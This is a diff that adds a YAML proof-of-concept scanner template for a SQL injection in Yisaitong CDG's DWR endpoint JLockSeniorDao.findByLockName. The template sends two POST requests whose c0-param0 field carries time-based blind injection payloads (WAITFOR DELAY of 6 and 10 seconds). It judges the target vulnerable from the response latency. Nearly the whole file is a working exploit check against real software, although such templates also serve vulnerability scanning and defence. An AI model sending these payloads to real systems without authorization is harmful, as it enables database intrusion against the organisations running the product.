@@ -1,0 +1,49 @@
+name: poc-yaml-yisaitong-CDG-findByLockName-sql
+transport: http
+
+
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /CDGServer3/dwr/call/plaincall/JLockSeniorDao.findByLockName.dwr
+      headers:
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
+        Content-Type: text/plain
+      body: "callCount=1\r\n\
+       page=/CDGServer3/dwr/test/JLockDao\r\n\
+       httpSessionId=\r\n\
+       scriptSessionId=\r\n\
+       c0-scriptName=JLockSeniorDao\r\n\
+       c0-methodName=findByLockName\r\n\
+       c0-id=0\r\n\
+       c0-param0=string:defaultKey1';WAITFOR DELAY '0:0:6'--\r\n\
+       batchId=0\r\n\
+       "
+    expression: response.latency >= 6000 && response.latency <= 7000
+  r1:
+    request:
+      method: POST
+      path: /CDGServer3/dwr/call/plaincall/JLockSeniorDao.findByLockName.dwr
+      headers:
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
+        Content-Type: text/plain
+      body: "callCount=1\r\n\
+       page=/CDGServer3/dwr/test/JLockDao\r\n\
+       httpSessionId=\r\n\
+       scriptSessionId=\r\n\
+       c0-scriptName=JLockSeniorDao\r\n\
+       c0-methodName=findByLockName\r\n\
+       c0-id=0\r\n\
+       c0-param0=string:defaultKey1';WAITFOR DELAY '0:0:10'--\r\n\
+       batchId=0\r\n\
+       "
+    expression: response.latency >= 10000 && response.latency <= 11000
+
+expression: r0() && r1()
+
+detail:
+  author: Superhero
+  links:
+    - https://blog.csdn.net/m0_60571842/article/details/141067188
